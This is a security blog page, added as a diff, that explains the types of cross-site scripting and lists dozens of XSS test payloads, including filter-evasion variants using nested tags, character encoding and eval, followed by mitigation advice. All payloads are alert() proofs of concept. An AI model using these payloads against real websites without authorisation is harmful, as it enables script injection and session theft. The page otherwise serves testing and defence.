@@ -1,0 +1,766 @@
+<!DOCTYPE html>
+<html lang="en-us" dir="ltr">
+    <head><meta charset='utf-8'>
+<meta name='viewport' content='width=device-width, initial-scale=1'><meta name='description' content="Payloads for Cross-Site Scripting (XSS) Payloads Cross-Site Scripting (XSS) Cross-Site Scripting (XSS) is a type of security vulnerability commonly found in web applications. It occurs when an attacker is able to inject malicious scripts (typically written in JavaScript) into web pages viewed by other users. This can happen when user input is not properly validated or sanitized by the application before being displayed to other users. There are several types of XSS attacks:">
+<title>Cross-Site Scripting (XSS) Payloads and Mitigation Strategies</title>
+
+<link rel='canonical' href='https://orangeymango.me/p/cross-site-scripting-xss-payloads-and-mitigation-strategies/'>
+
+<link rel="stylesheet" href="/scss/style.min.0304c6baf04e01a8fe70693791cb744d56a3578a3120a8796cefc66825aa39c7.css"><meta property='og:title' content="Cross-Site Scripting (XSS) Payloads and Mitigation Strategies">
+<meta property='og:description' content="Payloads for Cross-Site Scripting (XSS) Payloads Cross-Site Scripting (XSS) Cross-Site Scripting (XSS) is a type of security vulnerability commonly found in web applications. It occurs when an attacker is able to inject malicious scripts (typically written in JavaScript) into web pages viewed by other users. This can happen when user input is not properly validated or sanitized by the application before being displayed to other users. There are several types of XSS attacks:">
+<meta property='og:url' content='https://orangeymango.me/p/cross-site-scripting-xss-payloads-and-mitigation-strategies/'>
+<meta property='og:site_name' content='Orangeymango'>
+<meta property='og:type' content='article'><meta property='article:section' content='Post' /><meta property='article:tag' content='XSS' /><meta property='article:tag' content='Cross-Site Scripting' /><meta property='article:tag' content='Security Vulnerability' /><meta property='article:tag' content='Web Applications' /><meta property='article:tag' content='Injection Attacks' /><meta property='article:tag' content='JavaScript' /><meta property='article:tag' content='Vulnerability Mitigation' /><meta property='og:image' content='https://blogdetectify.cdn.triggerfish.cloud/uploads/2015/12/04174531/What-is-Cross-site-Scripting-XSS-and-how-can-you-fix-it_.png' />
+<meta name="twitter:title" content="Cross-Site Scripting (XSS) Payloads and Mitigation Strategies">
+<meta name="twitter:description" content="Payloads for Cross-Site Scripting (XSS) Payloads Cross-Site Scripting (XSS) Cross-Site Scripting (XSS) is a type of security vulnerability commonly found in web applications. It occurs when an attacker is able to inject malicious scripts (typically written in JavaScript) into web pages viewed by other users. This can happen when user input is not properly validated or sanitized by the application before being displayed to other users. There are several types of XSS attacks:"><meta name="twitter:card" content="summary_large_image">
+    <meta name="twitter:image" content='https://blogdetectify.cdn.triggerfish.cloud/uploads/2015/12/04174531/What-is-Cross-site-Scripting-XSS-and-how-can-you-fix-it_.png' />
+    <link rel="shortcut icon" href="/favicon.png" />
+
+  
+
+
+    </head>
+    <body class="
+    article-page
+    ">
+    <script>
+        (function() {
+            const colorSchemeKey = 'StackColorScheme';
+            if(!localStorage.getItem(colorSchemeKey)){
+                localStorage.setItem(colorSchemeKey, "auto");
+            }
+        })();
+    </script><script>
+    (function() {
+        const colorSchemeKey = 'StackColorScheme';
+        const colorSchemeItem = localStorage.getItem(colorSchemeKey);
+        const supportDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches === true;
+
+        if (colorSchemeItem == 'dark' || colorSchemeItem === 'auto' && supportDarkMode) {
+            
+
+            document.documentElement.dataset.scheme = 'dark';
+        } else {
+            document.documentElement.dataset.scheme = 'light';
+        }
+    })();
+</script>
+<div class="container main-container flex on-phone--column extended"><aside class="sidebar left-sidebar sticky ">
+    <button class="hamburger hamburger--spin" type="button" id="toggle-menu" aria-label="Toggle Menu">
+        <span class="hamburger-box">
+            <span class="hamburger-inner"></span>
+        </span>
+    </button>
+
+    <header>
+        
+            
+            <figure class="site-avatar">
+                <a href="/">
+                
+                    
+                    
+                    
+                        
+                        <img src="/img/avatar_huf062aff565fe6447eecdfa3973fcaef7_371015_300x0_resize_box_3.png" width="300"
+                            height="300" class="site-logo" loading="lazy" alt="Avatar">
+                    
+                
+                </a>
+                
+                    <span class="emoji">🍥</span>
+                
+            </figure>
+            
+        
+        
+        <div class="site-meta">
+            <h1 class="site-name"><a href="/">Orangeymango</a></h1>
+            <h2 class="site-description">asdasdasdadasdasd.</h2>
+        </div>
+    </header><ol class="menu-social">
+            
+                <li>
+                    <a 
+                        href='https://github.com/spiritedonion'
+                        target="_blank"
+                        title="GitHub"
+                        rel="me"
+                    >
+                        
+                        
+                            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-brand-github" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z" fill="none"/>
+  <path d="M9 19c-4.3 1.4 -4.3 -2.5 -6 -3m12 5v-3.5c0 -1 .1 -1.4 -.5 -2c2.8 -.3 5.5 -1.4 5.5 -6a4.6 4.6 0 0 0 -1.3 -3.2a4.2 4.2 0 0 0 -.1 -3.2s-1.1 -.3 -3.5 1.3a12.3 12.3 0 0 0 -6.2 0c-2.4 -1.6 -3.5 -1.3 -3.5 -1.3a4.2 4.2 0 0 0 -.1 3.2a4.6 4.6 0 0 0 -1.3 3.2c0 4.6 2.7 5.7 5.5 6c-.6 .6 -.6 1.2 -.5 2v3.5" />
+</svg>
+
+
+
+                        
+                    </a>
+                </li>
+            
+                <li>
+                    <a 
+                        href='https://twitter.com'
+                        target="_blank"
+                        title="Twitter"
+                        rel="me"
+                    >
+                        
+                        
+                            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-brand-twitter" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z" fill="none"/>
+  <path d="M22 4.01c-1 .49 -1.98 .689 -3 .99c-1.121 -1.265 -2.783 -1.335 -4.38 -.737s-2.643 2.06 -2.62 3.737v1c-3.245 .083 -6.135 -1.395 -8 -4c0 0 -4.182 7.433 4 11c-1.872 1.247 -3.739 2.088 -6 2c3.308 1.803 6.913 2.423 10.034 1.517c3.58 -1.04 6.522 -3.723 7.651 -7.742a13.84 13.84 0 0 0 .497 -3.753c-.002 -.249 1.51 -2.772 1.818 -4.013z" />
+</svg>
+
+
+
+                        
+                    </a>
+                </li>
+            
+        </ol><ol class="menu" id="main-menu">
+        
+        
+        
+        <li >
+            <a href='/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-home" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <polyline points="5 12 3 12 12 3 21 12 19 12" />
+  <path d="M5 12v7a2 2 0 0 0 2 2h10a2 2 0 0 0 2 -2v-7" />
+  <path d="M9 21v-6a2 2 0 0 1 2 -2h2a2 2 0 0 1 2 2v6" />
+</svg>
+
+
+
+                
+                <span>Home</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/archives/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-archive" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <rect x="3" y="4" width="18" height="4" rx="2" />
+  <path d="M5 8v10a2 2 0 0 0 2 2h10a2 2 0 0 0 2 -2v-10" />
+  <line x1="10" y1="12" x2="14" y2="12" />
+</svg>
+
+
+
+                
+                <span>Archives</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/search/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-search" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="10" cy="10" r="7" />
+  <line x1="21" y1="21" x2="15" y2="15" />
+</svg>
+
+
+
+                
+                <span>Search</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/links/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-link" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <path d="M10 14a3.5 3.5 0 0 0 5 0l4 -4a3.5 3.5 0 0 0 -5 -5l-.5 .5" />
+  <path d="M14 10a3.5 3.5 0 0 0 -5 0l-4 4a3.5 3.5 0 0 0 5 5l.5 -.5" />
+</svg>
+
+
+
+                
+                <span>Links</span>
+            </a>
+        </li>
+        
+        <li class="menu-bottom-section">
+            <ol class="menu">
+
+                
+                    <li id="dark-mode-toggle">
+                        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-left" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="8" cy="12" r="2" />
+  <rect x="2" y="6" width="20" height="12" rx="6" />
+</svg>
+
+
+
+                        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-right" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="16" cy="12" r="2" />
+  <rect x="2" y="6" width="20" height="12" rx="6" />
+</svg>
+
+
+
+                        <span>Dark Mode</span>
+                    </li>
+                
+            </ol>
+        </li>
+    </ol>
+</aside>
+
+    <aside class="sidebar right-sidebar sticky">
+        
+            
+                
+    <section class="widget archives">
+        <div class="widget-icon">
+            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-hash" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <line x1="5" y1="9" x2="19" y2="9" />
+  <line x1="5" y1="15" x2="19" y2="15" />
+  <line x1="11" y1="4" x2="7" y2="20" />
+  <line x1="17" y1="4" x2="13" y2="20" />
+</svg>
+
+
+
+        </div>
+        <h2 class="widget-title section-title">Table of contents</h2>
+        
+        <div class="widget--toc">
+            <nav id="TableOfContents">
+  <ol>
+    <li><a href="#cross-site-scripting-xss">Cross-Site Scripting (XSS)</a></li>
+    <li><a href="#vulnerability-details">Vulnerability Details:</a>
+      <ol>
+        <li><a href="#xss-in-htmlapplications">XSS in HTML/Applications:</a></li>
+        <li><a href="#xss-using-html5-tags">XSS using HTML5 tags:</a></li>
+      </ol>
+    </li>
+    <li><a href="#recommendation">Recommendation:</a></li>
+  </ol>
+</nav>
+        </div>
+    </section>
+
+            
+        
+    </aside>
+
+
+            <main class="main full-width">
+    <article class="has-image main-article">
+    <header class="article-header">
+        <div class="article-image">
+            <a href="/p/cross-site-scripting-xss-payloads-and-mitigation-strategies/">
+                
+                    <img src="https://blogdetectify.cdn.triggerfish.cloud/uploads/2015/12/04174531/What-is-Cross-site-Scripting-XSS-and-how-can-you-fix-it_.png" loading="lazy" alt="Featured image of post Cross-Site Scripting (XSS) Payloads and Mitigation Strategies" />
+                
+            </a>
+        </div>
+    
+
+    <div class="article-details">
+    
+    <header class="article-category">
+        
+            <a href="/categories/writing/" >
+                Writing
+            </a>
+        
+    </header>
+    
+
+    <div class="article-title-wrapper">
+        <h2 class="article-title">
+            <a href="/p/cross-site-scripting-xss-payloads-and-mitigation-strategies/">Cross-Site Scripting (XSS) Payloads and Mitigation Strategies</a>
+        </h2>
+    
+        
+    </div>
+
+    
+    
+    
+    
+    <footer class="article-time">
+        
+
+        
+            <div>
+                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-clock" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="12" r="9" />
+  <polyline points="12 7 12 12 15 15" />
+</svg>
+
+
+
+                <time class="article-time--reading">
+                    4 minute read
+                </time>
+            </div>
+        
+    </footer>
+    
+
+    
+</div>
+
+</header>
+
+    <section class="article-content">
+    
+    
+    <h1 id="payloads-for-cross-site-scripting-xss-payloads">Payloads for Cross-Site Scripting (XSS) Payloads
+</h1><h2 id="cross-site-scripting-xss">Cross-Site Scripting (XSS)
+</h2><p>Cross-Site Scripting (XSS) is a type of security vulnerability commonly found in web applications. It occurs when an attacker is able to inject malicious scripts (typically written in JavaScript) into web pages viewed by other users. This can happen when user input is not properly validated or sanitized by the application before being displayed to other users.</p>
+<p>There are several types of XSS attacks:</p>
+<ol>
+<li><strong>Stored XSS:</strong> Also known as persistent XSS, this occurs when the injected script is permanently stored on the target server, such as in a database or a file. Whenever a user visits the affected page, the malicious script is executed.</li>
+<li><strong>Reflected XSS:</strong> In this type of attack, the injected script is reflected off the web server, such as in an error message or search result. The attacker typically tricks a victim into clicking on a specially crafted link that contains the malicious payload.</li>
+<li><strong>DOM-based XSS:</strong> This occurs when the client-side script modifies the DOM (Document Object Model) in an unsafe way, leading to a XSS vulnerability. Unlike traditional XSS attacks, DOM-based XSS does not involve the server-side code.</li>
+</ol>
+<p>XSS attacks can have serious consequences, including:</p>
+<ul>
+<li>Theft of sensitive information such as cookies, session tokens, and login credentials.</li>
+<li>Manipulation of user sessions and actions.</li>
+<li>Defacement of websites.</li>
+<li>Distribution of malware to other users.</li>
+<li>Redirection to malicious websites.</li>
+<li>Compromise of user privacy.</li>
+</ul>
+<h2 id="vulnerability-details">Vulnerability Details:
+</h2><h3 id="xss-in-htmlapplications">XSS in HTML/Applications:
+</h3><ol>
+<li><strong>Basic Payloads:</strong>
+<ul>
+<li><code>&lt;script&gt;alert('XSS')&lt;/script&gt;</code>: Executes a simple JavaScript alert function.</li>
+<li><code>&lt;scr&lt;script&gt;ipt&gt;alert('XSS')&lt;/scr&lt;script&gt;ipt&gt;</code>: Attempts to evade filters by using nested script tags.</li>
+<li><code>&quot;&gt;&lt;script&gt;alert('XSS')&lt;/script&gt;</code>: Injects a script tag within an HTML attribute.</li>
+<li><code>&quot;&gt;&lt;script&gt;alert(String.fromCharCode(88,83,83))&lt;/script&gt;</code>: Utilizes character encoding to obfuscate the alert message.</li>
+<li><code>&lt;script&gt;\\u0061lert('22')&lt;/script&gt;</code>: Uses Unicode encoding to represent the script tag.</li>
+<li><code>&lt;script&gt;eval('\\x61lert(\\'33\\')')&lt;/script&gt;</code>: Executes the alert using JavaScript&rsquo;s eval function.</li>
+<li><code>&lt;script&gt;eval(8680439..toString(30))(983801..toString(36))&lt;/script&gt;</code>: Dynamically executes an alert by converting integers to strings.</li>
+<li><code>&lt;object/data=&quot;jav&amp;#x61;sc&amp;#x72;ipt&amp;#x3a;al&amp;#x65;rt&amp;#x28;23&amp;#x29;&quot;&gt;</code>: Uses HTML entity encoding to inject JavaScript.</li>
+</ul>
+</li>
+<li><strong>Img Payloads:</strong>
+<ul>
+<li><code>&lt;img src=x onerror=alert('XSS');&gt;</code>: Triggers an alert when the image fails to load.</li>
+<li><code>&lt;img src=x onerror=alert('XSS')//</code>: Uses a comment to bypass filters.</li>
+<li><code>&lt;img src=x onerror=alert(String.fromCharCode(88,83,83));&gt;</code>: Uses character encoding for the alert message.</li>
+<li><code>&lt;img src=x oneonerrorrror=alert(String.fromCharCode(88,83,83));&gt;</code>: Repeats characters to evade detection.</li>
+<li><code>&lt;img src=x:alert(alt) onerror=eval(src) alt=xss&gt;</code>: Injects JavaScript through the alt attribute.</li>
+<li><code>&quot;&gt;&lt;img src=x onerror=alert('XSS');&gt;</code>: Injects JavaScript within an HTML attribute.</li>
+</ul>
+</li>
+<li><strong>SVG Payloads:</strong>
+<ul>
+<li><code>&lt;svgonload=alert(1)&gt;</code>: Triggers an alert when the SVG loads.</li>
+<li><code>&lt;svg/onload=alert('XSS')&gt;</code>: Injects JavaScript within the onload attribute.</li>
+<li><code>&lt;svg onload=alert(1)//</code>: Utilizes a comment to bypass filters.</li>
+<li><code>&lt;svg/onload=alert(String.fromCharCode(88,83,83))&gt;</code>: Uses character encoding for the alert message.</li>
+<li><code>&lt;svg id=alert(1) onload=eval(id)&gt;</code>: Dynamically executes the alert using the id attribute.</li>
+<li><code>&quot;&gt;&lt;svg/onload=alert(String.fromCharCode(88,83,83))&gt;</code>: Injects JavaScript within an HTML attribute.</li>
+</ul>
+</li>
+<li><strong>Div Payloads:</strong>
+<ul>
+<li><code>&lt;div onpointerover=&quot;alert(45)&quot;&gt;MOVE HERE&lt;/div&gt;</code>: Triggers an alert when the mouse pointer moves over the div element.</li>
+<li><code>&lt;div onpointerdown=&quot;alert(45)&quot;&gt;MOVE HERE&lt;/div&gt;</code>: Triggers an alert when a pointer device button is pressed over the div.</li>
+<li><code>&lt;div onpointerenter=&quot;alert(45)&quot;&gt;MOVE HERE&lt;/div&gt;</code>: Triggers an alert when the pointer enters the div element.</li>
+<li><code>&lt;div onpointerleave=&quot;alert(45)&quot;&gt;MOVE HERE&lt;/div&gt;</code>: Triggers an alert when the pointer leaves the div element.</li>
+<li><code>&lt;div onpointermove=&quot;alert(45)&quot;&gt;MOVE HERE&lt;/div&gt;</code>: Triggers an alert when the pointer moves within the div element.</li>
+<li><code>&lt;div onpointerout=&quot;alert(45)&quot;&gt;MOVE HERE&lt;/div&gt;</code>: Triggers an alert when the pointer leaves the div element.</li>
+<li><code>&lt;div onpointerup=&quot;alert(45)&quot;&gt;MOVE HERE&lt;/div&gt;</code>: Triggers an alert when a pointer device button is released over the div.</li>
+</ul>
+</li>
+</ol>
+<h3 id="xss-using-html5-tags">XSS using HTML5 tags:
+</h3><ul>
+<li><strong><code>&lt;body onload=alert(/XSS/.source)&gt;</code></strong>: Triggers an alert when the page loads.</li>
+<li><strong><code>&lt;input autofocus onfocus=alert(1)&gt;</code></strong>: Triggers an alert when the input field gains focus.</li>
+<li><strong><code>&lt;select autofocus onfocus=alert(1)&gt;</code></strong>: Triggers an alert when the select element gains focus.</li>
+<li><strong><code>&lt;textarea autofocus onfocus=alert(1)&gt;</code></strong>: Triggers an alert when the textarea element gains focus.</li>
+<li><strong><code>&lt;keygen autofocus onfocus=alert(1)&gt;</code></strong>: Triggers an alert when the keygen element gains focus.</li>
+<li><strong><code>&lt;video/poster/onerror=alert(1)&gt;</code></strong>: Triggers an alert when the video fails to load.</li>
+<li><strong><code>&lt;video&gt;&lt;source onerror=&quot;javascript:alert(1)&quot;&gt;</code></strong>: Injects JavaScript within the source tag&rsquo;s onerror attribute.</li>
+<li><strong><code>&lt;video src=_ onloadstart=&quot;alert(1)&quot;&gt;</code></strong>: Triggers an alert when the video begins to load.</li>
+<li>**<code>&lt;details/open/ontoggle=&quot;alert\</code>**1<code>&quot;&gt;</code>: Triggers an alert when the details element is toggled open.</li>
+<li><strong><code>&lt;audio src onloadstart=alert(1)&gt;</code></strong>: Triggers an alert when the audio begins to load.</li>
+<li><strong><code>&lt;marquee onstart=alert(1)&gt;</code></strong>: Triggers an alert when the marquee element starts scrolling.</li>
+<li><strong><code>&lt;meter value=2 min=0 max=10 onmouseover=alert(1)&gt;2 out of 10&lt;/meter&gt;</code></strong>: Triggers an alert when the mouse pointer is moved over the meter element.</li>
+<li><strong><code>&lt;body ontouchstart=alert(1)&gt;</code></strong>: Triggers an alert when a touch event starts.</li>
+<li><strong><code>&lt;body ontouchend=alert(1)&gt;</code></strong>: Triggers an alert when a touch event ends.</li>
+<li><strong><code>&lt;body ontouchmove=alert(1)&gt;</code></strong>: Triggers an alert when a touch event moves.</li>
+</ul>
+<h2 id="recommendation">Recommendation:
+</h2><p>To mitigate the risk of XSS attacks, the following recommendations are provided:</p>
+<ul>
+<li>Implement strict input validation mechanisms to filter out potentially malicious input.</li>
+<li>Utilize output encoding techniques (e.g., HTML entity encoding, JavaScript escaping) to render user-supplied data safely.</li>
+<li>Implement a Content Security Policy (CSP) to restrict the execution of inline scripts and mitigate XSS risks.</li>
+<li>Conduct regular security assessments, including code reviews and penetration tests, to identify and remediate vulnerabilities.</li>
+<li>Educate developers on secure coding practices to prevent the introduction of XSS vulnerabilities in future development efforts.</li>
+</ul>
+<p>The identified XSS vulnerabilities pose a significant threat to the security. By exploiting these vulnerabilities, attackers could execute arbitrary JavaScript code within the context of users&rsquo; browsers, leading to various security risks, including data theft and unauthorized access. It is imperative that immediate action is taken to address these vulnerabilities and implement the recommended mitigation strategies to safeguard the application against XSS attacks.</p>
+
+</section>
+
+
+    <footer class="article-footer">
+    
+    <section class="article-tags">
+        
+            <a href="/tags/xss/">XSS</a>
+        
+            <a href="/tags/cross-site-scripting/">Cross-Site Scripting</a>
+        
+            <a href="/tags/security-vulnerability/">Security Vulnerability</a>
+        
+            <a href="/tags/web-applications/">Web Applications</a>
+        
+            <a href="/tags/injection-attacks/">Injection Attacks</a>
+        
+            <a href="/tags/javascript/">JavaScript</a>
+        
+            <a href="/tags/vulnerability-mitigation/">Vulnerability Mitigation</a>
+        
+    </section>
+
+
+    
+    <section class="article-copyright">
+        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-copyright" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="12" r="9" />
+  <path d="M14.5 9a3.5 4 0 1 0 0 6" />
+</svg>
+
+
+
+        <span>Licensed under CC BY-NC-SA 4.0</span>
+    </section>
+    </footer>
+
+
+    
+        <link 
+                rel="stylesheet" 
+                href="https://cdn.jsdelivr.net/npm/katex@0.16.9/dist/katex.min.css"integrity="sha384-n8MVd4RsNIU0tAv4ct0nTaAbDJwPJzDEaqSD1odI&#43;WdtXRGWt2kTvGFasHpSy3SV"crossorigin="anonymous"
+            ><script 
+                src="https://cdn.jsdelivr.net/npm/katex@0.16.9/dist/katex.min.js"integrity="sha384-XjKyOOlGwcjNTAIQHIpgOno0Hl1YQqzUOEleOLALmuqehneUG&#43;vnGctmUb0ZY0l8"crossorigin="anonymous"
+                defer
+                >
+            </script><script 
+                src="https://cdn.jsdelivr.net/npm/katex@0.16.9/dist/contrib/auto-render.min.js"integrity="sha384-&#43;VBxd3r6XgURycqtZ117nYw44OOcIax56Z4dCRWbxyPt0Koah1uHoK0o4&#43;/RRE05"crossorigin="anonymous"
+                defer
+                >
+            </script><script>
+    window.addEventListener("DOMContentLoaded", () => {
+        renderMathInElement(document.body, {
+            delimiters: [
+                { left: "$$", right: "$$", display: true },
+                { left: "$", right: "$", display: false },
+                { left: "\\(", right: "\\)", display: false },
+                { left: "\\[", right: "\\]", display: true }
+            ],
+            ignoredClasses: ["gist"]
+        });})
+</script>
+    
+</article>
+
+    
+
+    
+
+<aside class="related-content--wrapper">
+    <h2 class="section-title">Related content</h2>
+    <div class="related-content">
+        <div class="flex article-list--tile">
+            
+                
+<article class="has-image">
+    <a href="/p/basic-security/">
+        
+        
+            <div class="article-image">
+                
+                    <img src="https://dnycf48t040dh.cloudfront.net/fit-in/840x473/Basic-Guidelines-for-Internet-Security.jpeg" loading="lazy" data-key="" data-hash="https://dnycf48t040dh.cloudfront.net/fit-in/840x473/Basic-Guidelines-for-Internet-Security.jpeg"/>
+                
+            </div>
+        
+
+        <div class="article-details">
+            <h2 class="article-title">Basic Security</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="has-image">
+    <a href="/p/port-swigger-labs/">
+        
+        
+            <div class="article-image">
+                
+                    <img src="https://pbs.twimg.com/profile_images/1271377080220033024/InZ0OCwH_400x400.png" loading="lazy" data-key="" data-hash="https://pbs.twimg.com/profile_images/1271377080220033024/InZ0OCwH_400x400.png"/>
+                
+            </div>
+        
+
+        <div class="article-details">
+            <h2 class="article-title">Port Swigger Labs</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="has-image">
+    <a href="/p/fortigate-implementation-for-enhanced-enterprise-data-security/">
+        
+        
+            <div class="article-image">
+                
+                    <img src="https://images.ctfassets.net/aoyx73g9h2pg/2pgojF0xYbPiO90nEe6MQn/b3d29d5740c3ac82cf3ae21099c6ba60/1IzqGZkxtu1msh1CA4R3X_BpRTQa_FRu1_1-Featured-1024x572.jpg?w=1920&amp;q=100" loading="lazy" data-key="" data-hash="https://images.ctfassets.net/aoyx73g9h2pg/2pgojF0xYbPiO90nEe6MQn/b3d29d5740c3ac82cf3ae21099c6ba60/1IzqGZkxtu1msh1CA4R3X_BpRTQa_FRu1_1-Featured-1024x572.jpg?w=1920&amp;q=100"/>
+                
+            </div>
+        
+
+        <div class="article-details">
+            <h2 class="article-title">FortiGate Implementation for Enhanced Enterprise Data Security</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="has-image">
+    <a href="/p/aws-cloud-infrastructure/">
+        
+        
+            <div class="article-image">
+                
+                    <img src="https://k21academy.com/wp-content/uploads/2021/09/AWS-2.png" loading="lazy" data-key="" data-hash="https://k21academy.com/wp-content/uploads/2021/09/AWS-2.png"/>
+                
+            </div>
+        
+
+        <div class="article-details">
+            <h2 class="article-title">AWS Cloud Infrastructure</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="has-image">
+    <a href="/p/active-directory-penetration-test-report/">
+        
+        
+            <div class="article-image">
+                
+                    <img src="https://wolfcareers.com/wp-content/uploads/2023/01/1_cQGpZGkSuehv-YEXUweMQ-e1672674616339.webp" loading="lazy" data-key="" data-hash="https://wolfcareers.com/wp-content/uploads/2023/01/1_cQGpZGkSuehv-YEXUweMQ-e1672674616339.webp"/>
+                
+            </div>
+        
+
+        <div class="article-details">
+            <h2 class="article-title">Active Directory Penetration Test Report</h2>
+        </div>
+    </a>
+</article>
+
+            
+        </div>
+    </div>
+</aside>
+
+     
+    
+        
+    <div class="disqus-container">
+    <div id="disqus_thread"></div>
+<script>
+    window.disqus_config = function () {
+    
+    
+    
+    };
+    (function() {
+        if (["localhost", "127.0.0.1"].indexOf(window.location.hostname) != -1) {
+            document.getElementById('disqus_thread').innerHTML = 'Disqus comments not available by default when the website is previewed locally.';
+            return;
+        }
+        var d = document, s = d.createElement('script'); s.async = true;
+        s.src = '//' + "hugo-theme-stack" + '.disqus.com/embed.js';
+        s.setAttribute('data-timestamp', +new Date());
+        (d.head || d.body).appendChild(s);
+    })();
+</script>
+<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+<a href="https://disqus.com" class="dsq-brlink">comments powered by <span class="logo-disqus">Disqus</span></a>
+</div>
+
+<style>
+    .disqus-container {
+        background-color: var(--card-background);
+        border-radius: var(--card-border-radius);
+        box-shadow: var(--shadow-l1);
+        padding: var(--card-padding);
+    }
+</style>
+
+<script>
+    window.addEventListener('onColorSchemeChange', (e) => {
+        if (typeof DISQUS == 'object') {
+            DISQUS.reset({
+                reload: true
+            });
+        }
+    })
+</script>
+
+    
+
+    <footer class="site-footer">
+    <section class="copyright">
+        &copy; 
+        
+            2020 - 
+        
+        2024 Orangeymango
+    </section>
+    
+    <section class="powerby">
+        Built with <a href="https://gohugo.io/" target="_blank" rel="noopener">Hugo</a> <br />
+        Theme <b><a href="https://github.com/CaiJimmy/hugo-theme-stack" target="_blank" rel="noopener" data-version="3.26.0">Stack</a></b> designed by <a href="https://jimmycai.com" target="_blank" rel="noopener">Jimmy</a>
+    </section>
+</footer>
+
+
+    
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+
+    
+    <div class="pswp__bg"></div>
+
+    
+    <div class="pswp__scroll-wrap">
+
+        
+        <div class="pswp__container">
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+        </div>
+
+        
+        <div class="pswp__ui pswp__ui--hidden">
+
+            <div class="pswp__top-bar">
+
+                
+
+                <div class="pswp__counter"></div>
+
+                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+
+                <button class="pswp__button pswp__button--share" title="Share"></button>
+
+                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+
+                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+
+                
+                
+                <div class="pswp__preloader">
+                    <div class="pswp__preloader__icn">
+                        <div class="pswp__preloader__cut">
+                            <div class="pswp__preloader__donut"></div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+                <div class="pswp__share-tooltip"></div>
+            </div>
+
+            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+            </button>
+
+            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+            </button>
+
+            <div class="pswp__caption">
+                <div class="pswp__caption__center"></div>
+            </div>
+
+        </div>
+
+    </div>
+
+</div><script 
+                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.js"integrity="sha256-ePwmChbbvXbsO02lbM3HoHbSHTHFAeChekF1xKJdleo="crossorigin="anonymous"
+                defer
+                >
+            </script><script 
+                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe-ui-default.min.js"integrity="sha256-UKkzOn/w1mBxRmLLGrSeyB4e1xbrp4xylgAWb3M42pU="crossorigin="anonymous"
+                defer
+                >
+            </script><link 
+                rel="stylesheet" 
+                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/default-skin/default-skin.min.css"crossorigin="anonymous"
+            ><link 
+                rel="stylesheet" 
